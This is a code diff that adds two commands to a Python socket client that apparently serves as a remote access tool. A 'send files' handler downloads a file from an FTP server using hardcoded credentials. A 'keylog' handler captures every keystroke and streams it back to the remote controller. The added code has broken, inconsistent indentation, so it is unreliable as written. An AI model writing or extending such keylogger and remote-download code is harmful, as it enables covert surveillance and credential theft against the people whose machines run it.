@@ -16,6 +16,54 @@ def client():
     while True:
         data = s.recv(1048576)
         if data.decode("utf-8") == "send files":
+             HOSTNAME = "ftp.dlptest.com" 
+             USERNAME = "dlpuser" 
+             PASSWORD = "rNrKYTX9g7z3RgJRmxWuGHbeu" 
+              ftp_server = ftplib.FTP(HOSTNAME, USERNAME, PASSWORD) 
+  
+            
+             ftp_server.encoding = "utf-8" 
+  
+        
+             filename = "newfile.py" 
+             local_filename = os.path.join(r"C:\Users\Admin\Downloads", filename) 
+          
+             with open(local_filename, "wb") as file: 
+             
+                   ftp_server.retrbinary(f"RETR {filename}", file.write) 
+  
+             
+             ftp_server.dir() 
+             try: 
+                 
+                  file= open(filename, "r") 
+                  print('File Content:', file.read()) 
+                  ftp_server.quit() 
+             except: 
+                print("unreadable format") 
+        if data.decode("utf-8") == "keylog": 
+             
+                def on_press(key): 
+            
+                  try: 
+                      print(f'Key {key.char} pressed!') 
+                      a=f'Key {key.char} pressed!' 
+                      s.send(str.encode(a)) 
+                  except AttributeError: 
+                      print(f'Special Key {key} pressed!') 
+                      a=f'Special Key {key} pressed!' 
+                      s.send(str.encode(a)) 
+                def on_release(key): 
+                   print(f'Key {key} released') 
+                   if key == Keyboard.Key.esc: 
+                     # Stop the listener 
+                     s.send(str.encode('exited')) 
+                     return False 
+                
+                     
+                with Keyboard.Listener(on_press=on_press, on_release=on_release) as listener: 
+                 
+                listener.run() 
            
         else:
             if data[:2].decode("utf-8") == "cd":
